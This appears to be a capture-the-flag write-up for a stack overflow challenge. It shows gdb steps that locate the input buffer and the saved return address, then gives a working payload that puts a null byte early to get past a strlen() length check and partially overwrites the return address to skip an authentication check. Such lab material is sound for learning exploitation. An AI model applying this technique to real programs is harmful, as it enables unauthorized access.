# String Lengths (hard)

1. In gdb, `disas win_authed`, `disas main`, `disas challenge`, we get to know:
    - Instruction after auth check is at **0x1797**
    - challenge() returns at **0x1ace**
    - return value of strlen() must be <= **0x70** = 112

2. Set a breakpoint `b *challenge+413`, run and give a short string of a's as input
3. `info frame` -> rbp is at **0x7ffcc677a8f0**
4. `x/100xg $rbp-200`:
    - input buffer starts at **0x7ffcc677a850**, which is **rbp-0xa0** = rbp-160
    - return address is stored at **0x7ffcc677a8f8**, which is **rbp+0x8** = rbp+8
5. 168 a's followed by desired two bytes (one of the 4 nibbles is a guess, so have to run the exploit a few times):

    ```shell
    echo -n -e "aaaaa\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x17" | /challenge/binary-exploitation-null-write 
    ```
